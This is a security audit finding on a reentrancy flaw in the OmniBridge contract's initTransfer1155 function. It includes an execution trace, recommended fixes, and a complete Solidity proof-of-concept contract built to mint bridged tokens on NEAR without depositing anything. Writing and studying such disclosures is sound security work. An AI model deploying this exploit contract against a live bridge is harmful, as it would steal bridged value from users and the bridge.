### Title
Reentrancy in `initTransfer1155` via Malicious ERC1155 Callback Causes Nonce Collision and Unauthorized Cross-Chain Minting — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer1155` increments `currentOriginNonce` before making an external `safeTransferFrom` call to an attacker-controlled ERC1155 contract, but then reads `currentOriginNonce` again from storage — after the external call — when passing it to `initTransferExtension` and `emit InitTransfer`. There is no reentrancy guard anywhere in the contract. A malicious ERC1155 can reenter `initTransfer1155` during the callback, causing the outer call to emit an `InitTransfer` event with the inner call's nonce (a nonce collision), while nonce N is silently skipped. Combined with a malicious ERC1155 that does not actually transfer tokens, this allows an attacker to produce a valid, relayable `InitTransfer` event on EVM without depositing any tokens, resulting in unauthorized minting on NEAR.

---

### Finding Description

`initTransfer1155` follows this sequence:

```
currentOriginNonce += 1;                          // line 448 — nonce becomes N
...
IERC1155(tokenAddress).safeTransferFrom(          // line 458 — external call to attacker-controlled contract
    msg.sender, address(this), tokenId, amount, ""
);
...
initTransferExtension(..., currentOriginNonce, ...)  // line 471 — reads storage AGAIN
emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...)  // line 483 — reads storage AGAIN
``` [1](#0-0) 

The nonce is cached nowhere. After the external call at line 458, `currentOriginNonce` is read from storage at lines 471 and 483. If a reentrant call has incremented it in the meantime, the outer call silently uses the wrong nonce.

There is no `nonReentrant` modifier anywhere in the contract — confirmed by the absence of any `ReentrancyGuard` import or `nonReentrant` usage. [2](#0-1) 

**Concrete reentrant execution trace:**

| Step | `currentOriginNonce` | Action |
|---|---|---|
| Outer call enters | 0→**1** | `currentOriginNonce += 1` |
| Outer call hits `safeTransferFrom` | 1 | External call to malicious ERC1155 |
| Malicious ERC1155 reenters `initTransfer1155` | 1→**2** | Inner call: `currentOriginNonce += 1` |
| Inner call hits `safeTransferFrom` | 2 | Malicious ERC1155 returns normally (no reentry) |
| Inner call: `initTransferExtension` | 2 | Publishes Wormhole/event with **nonce=2** |
| Inner call: `emit InitTransfer` | 2 | Event emitted with **nonce=2** |
| Outer call resumes after `safeTransferFrom` | 2 | Malicious ERC1155 returns (no tokens transferred) |
| Outer call: `initTransferExtension` | 2 | Publishes Wormhole/event with **nonce=2** again |
| Outer call: `emit InitTransfer` | 2 | Event emitted with **nonce=2** again |

Result: nonce=1 is **never emitted**; nonce=2 is **emitted twice**. The malicious ERC1155 transfers tokens only during the inner call's `safeTransferFrom` (or not at all), while the outer call's `safeTransferFrom` returns without transferring. Both calls produce a valid `InitTransfer` event for nonce=2 with `amount` tokens. [3](#0-2) 

---

### Impact Explanation

The `InitTransfer` event (or Wormhole VAA published via `initTransferExtension`) is the sole signal the NEAR bridge uses to authorize minting on the NEAR side. Neither the NEAR bridge nor the Wormhole guardians verify that the EVM bridge contract actually received the ERC1155 tokens — they only observe the emitted event or VAA.

The attacker can produce a valid, relayable `InitTransfer` event for nonce=2 without depositing any ERC1155 tokens into the bridge. When the relayer submits this proof to NEAR, the NEAR bridge mints the corresponding bridged tokens to the attacker's NEAR address. This is **unauthorized minting / theft of bridged value** — a critical impact.

Additionally, nonce=1 is permanently skipped. Any legitimate user whose transfer was assigned nonce=1 (in a concurrent scenario) would have their transfer silently lost.

---

### Likelihood Explanation

The attack requires only:
1. Deploying a malicious ERC1155 contract (permissionless).
2. Calling `bridge.initTransfer1155` with that contract as `tokenAddress` (permissionless, no admin role required).
3. Optionally calling `logMetadata1155` first to register the token on NEAR (also permissionless).

No admin compromise, no private key leak, no front-running dependency, and no threshold MPC collusion is required. Any unprivileged EVM address can execute this attack.

---

### Recommendation

1. **Cache the nonce before the external call** so that `initTransferExtension` and `emit` always use the value that was assigned at the start of the call:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // cache before external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "");
    ...
    initTransferExtension(..., nonce, ...);
    emit BridgeTypes.InitTransfer(..., nonce, ...);
}
```

2. **Add a `nonReentrant` modifier** (OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer1155`, `initTransfer`, and `finTransfer` as defense-in-depth.

3. Apply the same nonce-caching fix to `initTransfer` for consistency, since it also reads `currentOriginNonce` after potential external calls. [4](#0-3)

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

/// @notice Malicious ERC1155 that reenters initTransfer1155 during safeTransferFrom
contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address bridge_) {
        bridge = IOmniBridge(bridge_);
    }

    /// @notice Called by OmniBridge.initTransfer1155 as IERC1155.safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter: inner call increments nonce to 2, emits InitTransfer(nonce=2)
            bridge.initTransfer1155(
                address(this), tokenId, uint128(amount), 0, 0, "attacker.near", ""
            );
            // Outer call will now also emit InitTransfer(nonce=2) — nonce=1 is lost
            // No tokens are actually transferred in either call
        }
        // On inner call: return normally (pretend transfer succeeded)
        // On outer call: return normally (no tokens transferred)
    }

    /// @notice Satisfy ERC1155 receiver check on the bridge
    function onERC1155Received(address, address, uint256, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return IERC1155Receiver.onERC1155Received.selector;
    }

    function balanceOf(address, uint256) external pure returns (uint256) {
        return type(uint256).max; // pretend attacker has infinite balance
    }

    function isApprovedForAll(address, address) external pure returns (bool) {
        return true;
    }
}

contract Attacker {
    function attack(address bridge) external payable {
        MaliciousERC1155 token = new MaliciousERC1155(bridge);
        // Single call produces two InitTransfer events for nonce=2,
        // nonce=1 is silently skipped, zero ERC1155 tokens deposited.
        IOmniBridge(bridge).initTransfer1155{value: msg.value}(
            address(token), 1, 1000e18, 0, 0, "attacker.near", ""
        );
        // Relayer submits the InitTransfer(nonce=2) proof to NEAR.
        // NEAR bridge mints 1000e18 tokens to attacker.near with zero EVM deposit.
    }
}
```

The outer call's `initTransferExtension` at line 471 reads `currentOriginNonce` from storage after the inner call has already incremented it to 2, so both calls publish a Wormhole message / emit an event for nonce=2. The NEAR bridge processes nonce=2 once and mints tokens. No ERC1155 tokens are ever held by the bridge. [5](#0-4)
